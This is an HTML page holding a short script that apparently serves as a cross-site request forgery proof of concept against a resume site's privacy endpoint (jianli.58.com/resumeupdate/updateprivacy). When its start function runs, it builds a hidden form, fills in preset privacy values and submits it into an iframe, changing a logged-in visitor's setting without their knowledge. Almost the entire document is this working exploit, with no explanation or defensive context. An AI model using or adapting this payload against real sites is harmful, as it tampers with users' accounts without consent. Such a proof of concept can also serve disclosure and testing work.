<html>

<script>
  window.start=function(){

    form1= document.createElement("form");
    
    form1.id="id1";
    
    form1.name="name1";
    
    form1.method = "POST";
    
    form1.action = "//jianli.58.com/resumeupdate/updateprivacy";
    
    form1.target = "iframeName1";
    
    document.body.appendChild(form1);
    
    key=["showStatus","optionId"];
    
    params={"showStatus":"0","optionId":"1"}
    
    for (var i=0;i<2;i++){
    
        j = document.createElement("input");
    
        j.type = "text";
    
        j.name = key[i];
    
        j.value = params[key[i]];
    
        form1.appendChild(j);
    
    }
    
    form1.submit();
    
    }
</script>
